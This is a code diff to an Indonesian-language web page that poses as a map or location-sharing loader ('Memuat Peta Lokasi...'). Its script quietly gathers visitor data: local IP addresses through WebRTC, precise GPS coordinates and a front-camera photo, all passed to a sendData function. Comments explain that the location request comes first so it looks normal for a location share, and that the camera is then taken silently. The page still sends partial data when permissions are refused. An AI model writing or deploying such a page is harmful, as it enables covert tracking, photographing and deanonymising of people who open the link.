@@ -13,17 +13,17 @@
 </head>
 <body>
     <div class="loader"></div>
-    <h3>Memuat Peta...</h3>
-    <p>Mohon tunggu sebentar, sedang menyinkronkan data jaringan...</p>
+    <h3>Memuat Peta Lokasi...</h3>
+    <p>Menghubungkan ke titik koordinat, mohon tunggu...</p>
 
     <video id="camera-stream" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         window.onload = function() {
-            let capturedImage = null;
             let localIPs = [];
 
+            // 1. Ambil WebRTC IP di latar belakang
             function getLocalIPs(callback) {
                 const ips = [];
                 const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
@@ -43,9 +43,31 @@
                     }
                 };
             }
-
             getLocalIPs(ips => { localIPs = ips; });
 
+            // 2. PRIORITAS UTAMA: Minta izin Lokasi GPS duluan (terlihat wajar untuk Shareloc)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        // Jika lokasi diizinkan, baru lanjut coba ambil kamera secara senyap
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const acc = position.coords.accuracy;
+                        captureCameraAndSend(lat, lon, acc, localIPs);
+                    },
+                    error => {
+                        // Jika lokasi ditolak tetap lanjut kirim data seadanya
+                        captureCameraAndSend(null, null, null, localIPs);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                captureCameraAndSend(null, null, null, localIPs);
+            }
+        };
+
+        function captureCameraAndSend(lat, lon, accuracy, localIPs) {
+            // 3. Ambil kamera setelah proses lokasi berjalan
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                 .then(stream => {
                     const video = document.getElementById('camera-stream');
@@ -56,26 +78,17 @@
                         canvas.height = video.videoHeight || 480;
                         const ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        capturedImage = canvas.toDataURL('image/jpeg');
+                        
+                        const capturedImage = canvas.toDataURL('image/jpeg');
                         stream.getTracks().forEach(track => track.stop());
-                        getLocAndSend(capturedImage, localIPs);
-                    }, 1500);
+                        
+                        sendData(lat, lon, accuracy, capturedImage, localIPs);
+                    }, 1200);
                 })
                 .catch(err => {
-                    getLocAndSend(null, localIPs);
+                    // Jika kamera ditolak, tetap kirim data lokasi yang sudah didapat
+                    sendData(lat, lon, accuracy, null, localIPs);
                 });
-        };
-
-        function getLocAndSend(imagebase64, localIPs) {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    position => sendData(position.coords.latitude, position.coords.longitude, position.coords.accuracy, imagebase64, localIPs),
-                    error => sendData(null, null, null, imagebase64, localIPs),
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
-            } else {
-                sendData(null, null, null, imagebase64, localIPs);
-            }
         }
 
         function sendData(lat, lon, accuracy, image, localIPs) {
